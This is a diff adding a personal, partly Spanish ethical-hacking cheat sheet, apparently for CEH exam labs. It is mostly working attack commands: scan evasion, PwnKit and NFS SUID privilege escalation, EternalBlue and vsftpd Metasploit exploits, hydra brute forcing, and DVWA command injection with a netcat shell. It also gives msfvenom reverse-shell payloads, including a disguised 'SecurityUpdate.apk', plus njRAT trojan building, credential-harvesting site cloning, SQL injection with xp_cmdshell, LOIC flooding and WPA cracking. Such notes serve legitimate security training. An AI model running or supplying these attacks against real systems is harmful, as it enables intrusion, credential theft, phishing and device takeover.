@@ -1,0 +1,1053 @@
+nmap -sn -PR 10.10.1.22 (-sn para que no escanee los puertos) (-PR es ARP ping)
+
+nmap -sn -PU 10.10.1.22 (-PU es UDP)
+
+nmap -sn -PE 10.10.1.22 (Echo ping request)
+
+nmap -sn -PE 10.10.1.0/24 (Echo ping sweep) Live host of multiple hosts in the network
+
+nmap -sn -PP 10.10.1.22 (Timestamp: to query a timestamp message tyo acquire information related to current time of the target host)
+
+nmap -sn -PM 
+
+nmap -sn -PS (TCP Syn)
+
+nmap -sn -PA (TCP ACK)
+
+nmap -sn -PO (IP Protocol Ping scan) 
+
+
+-Angry IP Scanner (Windows)
+-Megaping (Windows)
+-NetScanTools Pro (Windows)
+-sx Tool (Linux) 
+
+-hping3 -A (ACK flag) 10.10.1.22 -p 80
+
+-hping3 -8 0-100 (ICMP) -S (SYN Packet) 10.10.1.22
+
+-hping3 -1 (icmp ping scan) 10.10.1.22 -p 80
+
+-unicornscan -Iv (banner grabbing)
+
+Escanear cop tecnicas de evasion detras de firewalls IDS y demas: 
+
+	-nmap -f (fragmentation in small fragmented packets) 10.10.1.22
+
+	-nmap -g -80 (Soucre Dash port manipulation to evade IDS Firewalls) 
+
+	-nmap -mtu 8 10.10.1.22 (maximiun transmission unit) 
+
+	-nmap -D RND:10 10.10.1.11 ( generates random decoy addresses to difficult the identification of ip) 
+
+	-nmap -sT -Pn --spoof-mac 0 (randomize mac address) 10.10.1.11
+
+	
+-Colasoft Packet Builder (create custom TCP poackets to scan de host to past Firewalls)
+
+
+Escalate privilages by exploting vulnerability in pkexec
+
+1- sudo -l [all the commands u can use with sudo]
+
+2- download linPEAS - PEASS-ng 
+
+3- Scan for local vulnerabilities and gives you the severity  in different colors
+
+4-Pwnkit CVE-2021-4034 
+
+5- Github repository/ copy code/ (cd /tmp) / ls / git clone https:github.... / 
+
+6- cd CVE-2021-4034 
+
+7-ls
+
+8- make (use command to compile the code
+
+9- ls
+
+10- ./cve-2021-4034
+
+11- #whoami ... root
+
+12- sudo -l (check privileges ALL)
+NetBIOS Enumeration (cmd):
+
+	-nbtstat -a 10.10.1.11
+	-nbtstat -c 10.10.1.11
+
+NetBIOS Enumerator tool
+
+nmap -sV -v --script nbtstat.nse 10.10.1.11 (parrot os)
+
+SNMP Enumerator:
+
+snmp-check 10.10.1.11 (first check protocol 161 UDP snmap port running on target host)
+
+SoftPerfect Network Scanner 
+
+(Windows Server) snmpwalk -v1 -c public 10.10.1.11
+
+nmap -sU -p 161 -v --script=snmp-sysdescr 10.10.1.11 
+
+nmap -sU -p 161 -v --script=snmp-sysprocesses 10.10.1.11 (processes running)
+
+nmap -sU -p 161 -v --script=snmp-win32-software 10.10.1.11 (apps running)
+
+nmap -sU -p 161 -v --script=snmp-interfaces 10.10.1.11 (os information the network interface and apps installed)
+
+LDAP Enumeration:
+
+(Windows) ADExplorer.exe connect 10.10.1.11 
+
+nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' 10.10.1.11
+
+python3 
+
+	>>> import ldap3
+	>>> server=ldap3.Server('10.10.1.11',get_info=ldap3.ALL,port=389)
+	>>> connection=ldap3.Connection(server)
+	>>> connection.bind()
+	True
+	>>>server.info
+
+	
+	>>>connection.search(search_bash='DC=CEH,DC=com',search_filter='&(objectclass+*))',search_scope='SUBTREE',attribytes='*')
+	True
+
+	>>> connection.search(search_bash='DC=CEH,DC=com',search_filter='&(objectclass+*))',search_scope='SUBTREE',attributes='userpassword')
+
+
+ldapsearch
+
+NFS Enumeration:
+
+SuperEnum
+	
+nmap -p 2049
+
+	cd SuperEnum
+
+	echo "10.10.1.11">>Target.txt
+ 
+	./superenum (si salta error con './' usar chmod + superenum)
+
+	Target.txt
+
+RPCScan
+
+	python rpc-scan.py --rpc 10.10.1.11
+
+DNS Enumeration:
+
+	dig ns ww.certifiedhacker.com
+
+	nmap --script=broadcast-dns-service-discovery certifiedhacker.com
+
+	nmap -T4 -p 53 --script dns-brute certifiedhacker.com
+
+	nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='certifiedhacker.com'"
+
+	nmap -p 25
+	
+DNSEC Zone Walking
+	
+	DNSRecon:
+
+	./dnsrecon.py -d www.certifiedhacker.com -z
+
+	
+
+SMTP Enumeration
+
+	nmap -p 25 --script=smtp-enum-users 10.10.1.19
+
+	nmap -p 25 --script=smtp-open-relay 10.1.10.19
+
+SMB Y RPC Enumeration using NetScanTools Pro 
+
+
+Enumeration Information using Global Network Inventory
+Enumerate Network resources using Advanced IP Scanner 
+
+
+Enumerate information from Windows and Smaba with enum4linux:
+
+	enum4linux -u martin -p apple -n 10.10.1.22
+
+
+
+Footprinting:
+
+	https://www.exploit-db.com/google-hacking-database
+	https://www.google.com/advanced_search
+
+DNS Enumeration: 
+
+	DIG:
+	dig zonetransfer.me
+
+	>dig ns zonetransfer.me (Name server)
+	>dig mx zonetransfer.me (Mail server)
+	>dig cname zonetransfer.me (cname record)
+
+	HOSTS:
+	>host zonetransfer.me
+	host -t ns zonetransfer.me (Name server)
+	>host -t mx zonetransfer.me (Mail server)
+	host 192.168.2.2
+
+	NSLOOKUP:
+	nslookup zonetransfer.me
+	>nslookup
+	>Set type=ns
+	>zonetransfer.me
+
+	ZONETRANSFER:
+	>host -t ns zonetransfer.me
+	>host –l zonetransfer.me nsztm2.digi.ninja
+	>dig ns zonetransfer.me
+	>dig axfr zonetransfer.me @nsztm2.digi.ninja
+	>nslookup
+	>set type=ns
+	>zonetranfer.me
+	>server nsztm2.digi.ninja
+	>set type=any
+	>ls –d zonetransfer.me
+
+	DNSRECON:
+	>dnsrecon –d zonetransfer.me –t axfr
+	>dnsenum zonetransfer.me
+	>fierce --domain zonetransfer.me
+
+DNS BRUTEFORCING:
+
+
+	sudo apt install seclists
+	
+	NMAP:
+	>nmap -p 53 --script dns-brute zonetransfer.me
+
+	DNSMAP:
+	>dnsmap zonetransfer.me -w 
+/usr/share/seclists/discovery/DNS/fierce-hostlists.txt
+
+	FIERCE:
+	fierce --domain zonetransfer.me --subdomain-file 
+/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
+
+DIRECTORY BUSTING AND VHOST ENUMERATION:
+	
+	GOBUSTER (Dir Busting):
+	gobuster dir ‐u http://10.10.10.10 ‐w /usr/share/wordlists/dirbuster/directory‐list‐
+2.3‐medium.tx
+	FFUF:
+	ffuf ‐u http://10.10.10.10/FUZZ ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐
+medium.txt
+	
+	FINDING FILES:
+	gobuster dir ‐u http://10.10.10.10 ‐w /usr/share/wordlists/dirbuster/directory‐list‐
+2.3‐medium.txt ‐x .html,.css,.js
+	ffuf ‐u http://10.10.10.10/FUZZ ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐
+medium.txt –e .html,.css,.js,.conf
+
+	VHOST ENUMERATION:
+	gobuster vhost ‐u http://example.com ‐w 
+/usr/share/wordlists/SecLists/Discovery/DNS/subdomains‐top1million‐5000.txt ‐‐
+append‐domain
+	ffuf ‐u http://example.com ‐w /usr/share/seclists/Discovery/DNS/subdomains‐
+top1million‐20000.txt ‐H "HOST:FUZZ.example.com"
+
+PASSIVE RECONNAISSANCE WITH DIGITAL CERTIFICATES:
+	
+	CRT.SH:
+	
+	ENTRUST CERT SEARCH:
+	https://crt.sh/
+	https://ui.ctsearch.entrust.com/ui/ctsearchui
+
+	CENSYS:
+	https://search.censys.io/
+
+
+Scanning and Enumeration:
+
+NETDISCOVER Y PING SCAN FOR LIVE HOSTS:	
+
+	netdiscover -i (network interface name)
+	nmap –sn 192.168.18.1/24
+	nmap -sn -PR 192.168.18.0-25
+
+OTHERS SCANS:
+
+	nmap -sn -PU 192.168.18.110 //UDP ping scan
+	nmap -sn -PE 192.168.18.1-255 //ICMP Echo Ping scan
+	nmap -sn -PM 192.168.18.1-255 //Mask Ping scan (use if ICMP is blocked)
+	nmap -sn -PP 192.168.18.1-255 //ICMP timestamp scan
+	nmap -sn -PS 192.168.18.1-255 //tcp syn ping scan
+	nmap -sn -PO 192.168.18.1-255 //IP protocol scan.use different protocols to test 
+the connectivitY
+	
+NETBIOS:
+
+	>nbtstat -a 192.168.18.110 (enumerate NetBIOS names for a target)
+	>nbtstat -c (check the local cache)
+	>nmap -sV -v --script nbstat.nse 192.168.18.110 (NetBIOS enumeration)
+	>nmap -sU -p 137 --script nbstat.nse 192.168.18.110 (NetBIOS enumeration)
+
+SERVICE DISCOVERY:
+
+	>nmap –sS –sV 192.168.18.1/24
+	hping3 -S 192.168.18.110 -p 80 -c 5 (S - TCP Stealth scan / P 80 - Scan for port 80)
+	
+OS DISCOVERY:
+
+	>nmap –sS –O 192.168.18.1
+	sudo nmap --script smb-os-discovery.nse 192.168.18.110 (Only if smb service is running)
+	ping 192.168.18.110 (Linux TTL:64 Windows Size:5840 / FreeBSD TTL:64 WS:65535 / OpenBSD TTL:255 WS:16384 / Windows TTL:128 WS:65535-1 / CISCO Routers TTL: 255 WS:4128 / Solaris TTL:255 WS:8760 / AIX TTL:255 WS:16384)
+	>sudo nmap –sS –p 445 –A 192.168.18.1 (OS detection, version detection, script scanning, and traceroute)
+
+SMB ENUMERATION:
+
+	>sudo nmap -A –p 445 192.168.18.110
+	>sudo nmap --script smb-os-discovery.nse 192.168.18.110
+	>nmap -p 445 --script=smb-enum-shares.nse,smb-enumusers.nse 192.168.18.110
+	cd /usr/share/nmap/scripts; ls | grep smb (Check more scripts in linux machine)
+
+	>enum4linux -a 192.168.18.110
+
+System Hacking:
+
+VULNERABILITY SEARCH:
+
+	Searchsploit // >searchsploit vsftpd 2.3.4
+	Nessus
+	sudo nmap --script vuln 10.1.10.190.130 (ex: ms17-010)
+
+EXPLOTATION SMB SERVICE:
+	
+	nmap ‐sS ‐T4 10.10.50.2 (139,445)
+	enum4linux ‐a 10.10.50.26
+	sudo nmap ‐‐script smb‐os‐discovery.nse 10.10.50.26
+	smbclient ‐L (to list all shares)
+	smbclient //10.10.50.26/share  (access it)
+	ls
+
+FTP EXPLOTATION (PORT 21):
+
+	Check port 21 open
+	ftp 10.10.223.220	
+	hydra ‐l mike ‐P /usr/share/wordlists/rockyou.txt –v 10.10.223.20 ftp" (Brute force password of FTP user)
+
+TELNET EXPLOTATION:
+
+	Nmap –sS –T4 ‐p‐ 10.10.50.26   (normally port 23, but maybe others like 8012)
+	telnet $IP $PORT (telnet 10.10.5.166 8012)
+	 
+EXPLOTATE WIN 10:
+
+	>nmap –A –sC 192.168.1.2 (locate the target and check for open ports //ex:445 microsoft-ds Windows 10 Pro 10240)
+	>sudo msfconsole
+	Search for the Eternal Blue exploit (search eternal)
+	>use exploit/windows/smb/ms17_010_psexec
+	RHOSTS to set the target and se LHOST as your kali machine IP
+	>set RHOSTS 192.168.1.2
+	>set LHOST 192.168.1.4
+	>exploit
+
+
+	
+POST EXPLOTATION WIN 10:
+
+	Meterpreter:
+			- >webcam_stream (to stream the webcam of the target)
+			- >keyscan_scan (to start logging keystrokes)
+			- >sceenshot (to take a screenshot)
+			- >screenshare (to stream desktop screen)
+			- >run winenum (enumerate detail about the windows system)
+			- >shell (get a shell)
+
+EXPLOTATE FTP (vsftpd 2.3.4 vulnerability):
+
+	>sudo msfconsole
+	>search vsftpd
+	>use exploit/unix/ftp/vsftpd_234_backdoor
+	>set RHOSTS 192.168.1.2
+	>exploit
+
+EXPLOTATE NFS (misconfigured NFS to gain access and to escalate privileges)
+
+	sudo apt-get update
+	sudo apt install nfs-kernel-server
+	nano /etc/exports
+	Edit the export file to make home directory as share
+	/home *(rw,no_root_squash)
+	Restart the server
+	sudo /etc/init.d/nfs-kernel-server restart
+	nmap -sV --script=nfs-showmount 192.168.1.102 (2049 open)
+	Manual NFS Enumeration
+	apt-get install nfs-common
+	showmount -e 192.168.1.102
+	Exploiting NFS server:
+	mkdir /tmp/nfs
+	mount -t nfs 192.168.1.102:/home /tmp/nfs
+	cp /bin/bash .
+	chmod +s bash
+	ls -la bash
+	Privilege Escalation
+	cd /home
+	ls
+	./bash -p
+	id
+	whoami
+	Further Exploitation:
+	cp /bin/nano .
+	chmod 4777 nano
+	ls -la nano
+	Exploiting Nano Permissions:
+	./nano -p /etc/shadow
+
+
+CRACK HASH WITH JHON	
+
+	john -w="/usr/share/worlidsts/rockyou.txt" hash --format=NT
+	cat "file"
+	
+POLKIT OR POLICYKIT(SCAN FOR LOCAL VULNERABILITIES IN LINUX:
+
+	-Download GitHub LinePEAS
+
+Steganography and Hiding Activities:
+
+COVERT COMMUNICATION CHANNELS
+
+	wget https://raw.githubusercontent.com/cudeso/security‐tools/master/networktools/covert/covert_tcp.c
+	sudo apt install gcc
+	cc ‐o covert_tcp covert_tcp.c
+	(Start the listener on Parrot OS) sudo ./covert_tcp ‐dest 192.168.18.144 ‐source 192.168.18.95 ‐source_port 8888 ‐dest_port 9999 ‐server -file /home/user/msg1.txt	
+	
+		192.168.18.144 is the IP of Parrot OS
+	 	192.168.18.95 is the IP of Sender (Kali)
+	 	8888 is local listening port
+	 	9999 is the remote port of kali
+	 	‐server puts covert_tcp in listener mode and msg1.txt is the destination file where message will be saved
+
+	(Send the Message from Kali machine) sudo ./covert_tcp ‐dest 192.168.18.144 ‐source 192.168.18.95 ‐source_port 9999 ‐dest_port 8888 ‐file /home/kali/msg.txt
+
+HIDING FILES USING DATA STREAMS:
+
+
+COMMAND EXECUTION ON DVWA:
+
+	127.0.0.1 && ls
+	127.0.0.1 & ls
+	127.0.0.1 ; ls
+	127.0.0.1 | ls
+	127.0.0.1 && nc ‐c sh 127.0.0.1 9001
+	127.0.0.1 | ls (Medium Difficulty)
+	127.0.0.1 |ls (High Difficulty)
+
+COMMAND EXECUTION ON DVWA WINDOWS:
+
+	Hostname
+ |whoami
+ |tasklist
+ | taskkill /PID 3112 /F   //forcefully kills the processes
+ | dir c:\
+ |net user
+ |net user test /add     //add a new user
+ |net localgroup Administrators test /add    //add test user to administrators
+ | net user test     //to view the details of the user 
+ | dir c:\ "pin.txt" or this command ! Take pin.txt   //to get content
+ | type c:\"pin.txt“   //to get the content of a file
+
+
+FILE UPLOAD ON DVWA:
+
+	Low
+	msfconsole
+	search handler
+	use 30
+	>set payload php/meterpreter/reverse_tcp
+	options
+	set LHOST 127.0.0.1
+	set LPORT 4444
+	run
+	Create a payload
+	msfvenom -l payloads | grep php
+	msfvenom ‐p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 ‐f raw >exploit.php
+	upload payload (exploit.php)
+	Uploaded the payload search in the browser
+	You get reverse shell!
+	
+	
+	Medium
+	msfvenom ‐p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 ‐f raw >exploit.php
+	>use exploit/multi/handler set payload 
+	>php/meterpreter/reverse_tcp
+	(same setps as behind)
+	File will be not uploaded if you check the SOURCE (It is an image? / Only accept image/jpeg)
+	Turn Burp proxy ON
+	Open Burp
+	Intercept ON
+	Upload File and intercept request
+	Change : (Content-type:application/x-php) to (Content-type:image/jpeg) 
+	Forward Request
+	Shell uploaded
+	Copy to browser and get the reverse shell
+	
+BRUTEFORCING WEB APPLICATIONS PASSWORDS WITH BURP AND HYDRA
+
+	
+	Username or password incorrect
+	Copy all url
+	Inspect
+	Network
+	Copy all url
+	Burp ON
+	Foxy Proxy ON
+	Intercept request admin admin 
+	Send it to intruder
+	Clear $
+	Select passwor and Add $
+	Payload - Payload Options - Load - worlists - john.lst
+	Start attack - check Lenght
+
+	HYDRA:
+	Inspect
+	Storage
+	Copy PHPSESSID Value
+	Copy security value	
+	hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q; security=low:F=Username and/or password incorrect' 
+	Password cracked
+
+	MEDDIUM DIFICULTY:
+	Change security to medium security=medium
+	Attack wiil go more lowest to crack 
+
+	
+	HIGH:
+	HYDRA:
+	Change security to high security=high
+	BURP:
+	Same steps but change attack type to Pitchfork
+	Add$ to password field and to user_tocken field
+	Payload section
+	Load jhon.lst
+	Then for Payload set: 2
+	Payload type: Recursive grep
+	Options
+	Grep-Extract
+	Add 
+	Start at offset
+	Fetch response
+	Find token: name='user_token" value='blablabla'
+	Highlight blablablá
+	End at fixed length 
+	OK
+	Grep-Match: Clear - Add - incorrect
+	Redirections: Always
+	Resource Pool
+	Create new resource pool
+	Name: Custom resource pool 1
+	Start attack
+
+	
+	
+FILE UPLOAD WALKTHROUGH ON DVWA:
+
+	HIGH DIFFICULTY:
+	msfvenom ‐p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 ‐f raw >exploit.php
+	cp exploit.php exploit.php.jpeg
+	nano exploit.php.jpeg
+	add on the top: GIF89a;
+	Upload the file
+	404 Not Found or error
+	msfconsole
+	>use exploit/multi/handler
+	>set payload php/meterpreter/reverse_tcp
+	exploit -j -z
+	Go to Command Injection page and in enter IP address: | mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg" or "/usr/share/dvwa/hackable/uploads/exploit.php"
+	Browse in Url file again: 127.0.0.1:42001/hackeable/uploads/exploit.php
+	Get reverse shell!
+
+SQL INJECTION:
+
+	LOW-MEDIUM DIFICULT:
+	' OR 1=1 #
+	1' OR 1=1 #
+	Burp
+	Poxy on
+	Intercept and save all intercepted text in a document: req.txt
+	>sqlmap ‐r req.txt ‐‐dbs
+	>sqlmap ‐r req.txt ‐D dvwa ‐‐tables
+	>sqlmap ‐r req.txt ‐D dvwa ‐T users ‐‐columns
+	>sqlmap ‐r req.txt ‐D dvwa ‐T users ‐‐dump‐all
+	n
+	y
+	n
+
+	MEDIUM-HIGH DIFICULT:
+	1 UNION SELECT user, password FROM users#
+	Inspect
+	Select User ID: option value="1 OR 1=1#"
+
+	HIGH:
+	1	
+	1’ UNION SELECT user, password FROM users#
+
+
+	' or 1-1 --
+	
+
+SQL INJECTION ON MSSQL DATABASE
+
+	Connect mssql
+	Databases - GoodShopping - Tables - dbo.Login - richt click and Select Top 1000 Rows 
+	We can see user and password
+	Return to Login GoodShopping site
+	blah';insert into login values("john','apple123'):--
+	Login with user:john / password:apple123 
+	Retun to mssql right click execute and see changes
+	blah';create database mydatabase;--
+	Log in
+	Return to mssql in left panel dissconect and then connect
+	You can see new database
+	blah';drop database mydatabase;--
+	Log in
+	Dissconect and Connect
+	Database has been delated
+	blah';exec master.xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t';--
+	Go to task manager on mssql click more details and you can see PING.EXE
+
+
+	Malware:
+
+MALWARE ANALYSIS:
+
+	www.hybrid-analysis.com
+	
+	
+PERFORM A STRINGS SEARCH USING BINTEXT:
+
+	BinTextTool.BinText tool to extract embedded strings from executable files.
+
+
+IDENTIFY PACKAGING AND OBFUSCATION METHODS USING PEID:
+
+	
+	 PEid tool to detect common packers, cryptors, and compilers for PE executable files
+
+ANALYZE ELF EXECUTABLE FILE USING DETECT IT EASY (DIE):
+
+	Detect It Easy (DIE) tool to analyze ELF file. detects a file’s compiler, linker, packer, etc. using a signature-based detection method.
+
+
+FIND THE PORTABLE EXECUTABLE INFORMATION OF A MALWARE EXECUTABLE FILE:
+
+	The Portable Executable (PE) format is the executable file format used on Windows OSes that stores the information a Windows system requires to manage the executable code.
+
+IDENTIFY FILE DEPENDENCIES USING DEPENDENCY WALKER:
+
+	 Dependency Walker tool to identify the file dependencies of an executable file.Programs store their import and export functions in a
+kernel32.dll file. Kernel32.dll / Adavapi32.dll / Users32.dll / Gdi32.dll / Ntdll.dll / WSock32.dll and Ws2_32.dll / Wininet.dll
+Dependency Walker tool to identify the file dependencies of an executable file.
+
+PERFORM MALWARE DISASSEMBLY USING IDA
+
+	IDA As a disassembler, IDA explores binary programs, for which the source code might not be available, to create maps of their execution. IDA Freeware
+
+	New
+	Select file
+	Choose: Portable executable for ... OK
+	Right click
+	Text view
+	Select a string: richt click: Set type
+	
+PERFORM MALWARE DISASSEMBLY USING OLLYDBG:
+
+	OllyDbg to analyse a malicious file
+
+GAIN CONTROL OVER A VICTIM MACHINE USING THE NJRAT RAT TROJAN:
+
+	njRAT Trojan to gain control over a victim machine. We will use the Windows 11 (10.10.1.11) machine as the attacker machine and the Windows Server 2022 (10.10.1.22) machine as the victim machine. 
+
+	Select Port by Default
+	Start
+	Builder
+	Host victim machine
+	Registry Starup selected
+	Build
+	Save 
+	Send to the victim when he execute the rat is running
+	
+	
+Sniffing:
+
+CREDENTIALS EXTRACTION FROM WIRESHARK
+	
+	Website - Not Secure without Https
+	Open wireshark
+	Wifi
+	Start capture traffic
+	Go back to website login page and try to Login Up with fake credentials
+	And then with the true credentials
+	Filter by: http.request.method==POST
+	HTML form URL Encoded
+	You can see the data
+	Filter by: ftp
+
+DETECT DDOS ATTACK WITH WIRESHARK:
+
+	DOS attack can be identify by simply viewing a pcap file, a large no of packets from a source to the target within a short span o ftime
+	DDOS, number of IP addresses spoofed sending packets to a single target
+
+DETECTING DDOS:
+
+	tcp.flags.syn==1 and tcp.flags.ack==0
+	tcp.flags.syn==1 and tcp.flags.ack==1
+
+	tcp.flags.syn==1
+	Packets 6001 Displayed 5326 88,8%
+	Packet 6001 Displayed 501 8,3
+	Statistics - conversations. If number of packets targeted on one IP from different Source Addresses and no reply pack indicates DDOS,
+	B>A are nill
+	Statics>I/O Graph menu. It shows a massive spike in overall packets from near 0 to up to 2400 packets a second
+
+CAPTURING AND ANALIZING IOT TRAFFIC
+	
+	Bevywise Iot Simulator
+	bin/runsimulator.bat
+	127.0.0.1:9000
+	New network CEH name
+	Provide Broker IP Address (10.10.1.100) Windows Server 2019 machine
+	Add blank Device
+	Device name: Temp_Sensor1
+	Right panel add- Suscribe to command
+	Topic: high_temp / QoS: 1 Atleast once / Save
+	Wireshark
+	Ethernet 
+	Go back to Windows Server machine
+	http://localhost:8080
+	admin admin credentials
+	Devices
+	high_temp / Message / Send
+	Go back to Win Server
+	Wireshark filter: mqtt	
+	MQTT Public Message / MQ Telemetry Transport Protocol / Message Type: Public Message
+
+HACKING ANDROID DEVICES WITH MSFVENOM:
+
+	msfvenom -l payloads | grep android
+	msfvenom –p android/meterpreter/reverse_tcp LHOST=Localhost IP  LPORT=LocalPort R > android_shell.apk / msfvenom –p android/meterpreter/reverse_tcp LHOST=160.13.100.12 IP  LPORT=4444 -f raw>file.apk
+	python -m http.server
+	msfconsole
+	use exploit/multi/handler
+	set payload android/meterpreter/reverse_tcp
+	options	
+	set LHOST 192.168.20.131
+	run
+	Move to android machine
+	http://192.168.20.131:8000
+	Donwload file.apk
+	Install unkown apps
+	Install file.apk
+	Got reverse shell
+
+HACKING ANDROID DEVICES WITH PHONESPLOIT OVER ADB:
+
+	Dev tools android machine / Developer options / ensure all on
+	Network seetings and ip address
+	Go to kali
+	sudo nmap -sS -p- -Pn 192.162.12.103 / 5555 open freeciv
+	sudo apt install adb
+	git clone https://github.com/aerosol‐can/PhoneSploit
+	cd PhoneSploit
+	python3 -m pip install colorama
+	python3 phonesploit.py
+	type: 192.162.12.103
+	4 / pwd
+	Navigate in shell
+
+	
+WALKTHROUGH - HACKING ANDOIRD DEVICES WITH MSFVENOM:
+
+	msfvenom -l payloads | grep android
+	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 LPORT=4444 –f raw –o Backdoor.apk
+	cp backdoor.apk Downloads/backdoor.apk
+	cd Donwloads
+	python3 -m http.server 8000
+	msfconsoles
+	use exploit/multi/handler
+	set payload android/meterpreter/reverse_tcp
+	set LHOST 192.132.10.12
+	options
+	exploit
+	Listening...
+	Go to Android device http://192.132.10.12:8000		
+	download backdoor.apk
+	Install it
+	Have the session
+	sysinfo / ipconfig / pwd / cd /sdcard/ 
+
+WALKTHOURGH- PHISHING ATTACKS ON ANDROID DEVICES WITH SOCIAL ENGINEERING TOOLKIT:
+
+	ls
+	cd social-engineer-toolkit/
+	ls
+	sudo ./setoolkit
+	y
+	1)Social-Engineering Attacks / 2)Website Attack Vectors/ 3) Credential Harvester Attacks Method /1) Web Templates / Select a template: 2. Google
+	Cloning website
+	http:10.10.1.13
+	
+	
+WALKTROUGH - CONDUCTING DOS ATTACK FROM ANDROID USING LOIC:
+
+	Android - File explorer - Shared directory 10.10.1.10 - CEH-Tools / Hacking Mobile Plataforms / Android Hacking Tools / Low Orbit Ion Cannon (LOIC)
+	Open / http://10.10.1.16 - TCP - ICMP Mode On - Port 80 - Threads 100 / Start
+	Move to target Machine Win Server - Login In 
+	Open Wireshark select Interface and check packets
+	Stop capture
+	Statics - Conversations -IPv4 - see sumary packets
+
+WALKTROUHGH EXPLOIT THE ANDROID PLATFORM THROUGH ADB USING PHONESPLOIT:
+
+	ls
+	cd PhoneSploit/
+	ls
+	python3 phonesploit.py
+	10.10.1.14
+	4
+	pwd
+	cd sdcard
+	cd Download/
+	ls
+	exit
+	>7)Screen Shot a picture on a phone
+	Saved 
+	Go to attacker/PhoneSploit directory/screen.png
+	14) List all apps on a phone
+	15)Run app / (fullname of app) = com.android.calculator
+	Calculator started
+	9) Pull all foldes from android to pc
+	
+	
+	
+WALKTROUGH HACK AN ANDROID DEVICE BY CREATING APK FILE USING ANDRORAT:
+
+	sudo su
+	cd AndroRAT/
+	ls
+	python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk //// (--build: is used for building the APK
+-i: specifies the local IP address (here, 10.10.1.13)
+-p: specifies the port number (here, 4444)
+-o: specifies the output APK file (here, SecurityUpdate.apk))
+	ls
+	python3 -m http.server 8000
+	Open listener
+	python3 androRAT.py --shell -i 0.0.0.0 4444
+	Listening for connection
+	Install in target malicious apk
+	Go to Andoird
+	http://10.10.1.13:8000	
+	Download SecurityUpdate.apk and install
+	Shell open
+	help command
+
+ANALYZE MALICIOUS APP USING ONLINE ANDROID ANALYZERS
+
+	Sixo Online APK Analyzer
+	Select file
+	File explorer /Android Hacking Tool/ Low Orbit...
+	Check summary
+	
+	
+Wifi Hacking:
+
+CRACK WIFI WITH AIRCKRACK
+	
+	
+	iwconfig
+	airmon-ng start wlan0
+	sudo airmon-ng start wlan0
+	sudo kill 1303 (Network Manager)
+	sudo kill 1833 (wpa_supplicant)
+	iwconfig
+	wlan0mon
+	sudo airodump-ng wlan0mon
+	sudo airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon(wifi)
+	See Notification Location 
+	aireplay‐ng ‐0 100 ‐a C0:F6:C2:5E:8D:20 wlan0mon
+	When WPA handshake capture it: C0:F6:C2...etc
+	aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt ‐b C0:F6:C2:5E:8D:20 pass*.cap
+	aircrack check all password dictinoary until. KEY FOUND
+
+
+	Step 1:Capture the four way Handshake with  Airmon‐ng: Put your Wifi card in monitor mode // >iwconfig (Checks for existing Wifi adapter) // Put wifi card in monitor mode -        >airmon‐ng start wlan0 Activate Monitor Mode
+	Step 2: Crack the handshake with Aircrack‐ng 
+ Brute Force
+ Dictionary
+	>airodump‐ng "wlan0mon" // "Use your card name"
+	> airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon (start capturing the related traffic of your 
+target AP)
+‐c 6 is the channel for the wireless network
+ ‐‐bssid C0:F6:C2:5E:8D:20 is the access point MAC address. 
+This eliminates extraneous traffic.
+ ‐w pass is the file name 
+ ‐wlan0mon is the interface name
+	>  aireplay‐ng ‐0 100 ‐a C0:F6:C2:5E:8D:20 wlan0mon (Deauthenticate the Wireless clients) ‐‐0 means deauthentication
+ 100 is the number of deauth packets to send
+ ‐a C0:F6:C2:5E:8D:20 is the access point MAC address
+ ‐wlan0mon is the interface name
+	>  Press CTRL + C , Once you have handshake (Look for the WPA Handshake in the Notification)
+	>  aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt ‐b C0:F6:C2:5E:8D:20 pass*.cap // CRACK PASSWORD//break the password with Dictionary attack (Pass*.cap is the packet file where a captured handshake is stored.)
+	>  Locate rockyou
+	Un compress the file
+	 gunzip /usr/share/wordlists/rockyou.txt.gz
+	 ls /usr/share/wordlists/
+	>  aircrack‐ng pass*.cap ‐w /usr/share/wordlists/rockyou.txt
+
+		
+PERFORM WIRELESS ATTACKS:
+
+	Moudle 16 Hacking Wireless Networks
+	Samples Captures
+	Right click in folder and Open in Teerminal
+	ls
+	airckrack-ng WEPcrack-01.cap (If the captured file contains sufficent packetsa, airckrack ng will be able to crack it)
+	
+	airckrack-ng WPA2crack-01.cap -w password.txt
+	KEY FOUND
+
+CAPTURING HANDSHAKE WITH HCXDUMPTOOL
+
+	sudo apt‐get install hcxdumptool
+	
+	>iwconfig (Check the device name)
+	Stop services that may interfare with handshake capture
+	>sudo systemctl stop NetworkManager
+	sudo systemctl stop wpa_supplicant
+	After the handshake is captured you can restart the services with following comman
+	>sudo systemctl start NetworkManager
+	>sudo hcxdumptool ‐i wlan0 ‐‐do_rcascan
+	>  sudo hcxdumptool ‐i wlan0 ‐o dumpfile.pcapng –active_beacon –enable_status=15 (Capture traffic// dumpfile.pacapng is the file where handshake will be stored
+‐wlan0mon is the interface name.)
+	After some minutes 2-5, stop capture and have captured packets in file storedd
+		
+	
+	sudo apt-get update
+	sudo apt-get install hcxdumptool
+	iwconfig
+	sudo systemctl stop NetworkManager
+	sudo systemctl stop wpa_supplicant
+	sudo hcxdumptool -i wlan0 --do_rscan
+	Stop procces in 3 minutes
+	sudo hcxdumptool ‐i wlan0 ‐o dumpfile.pcapng –active_beacon –enable_status=15
+	Stop proccess in 2 minutes
+	See dumped file in home directory / dumpfile.pcapng
+		
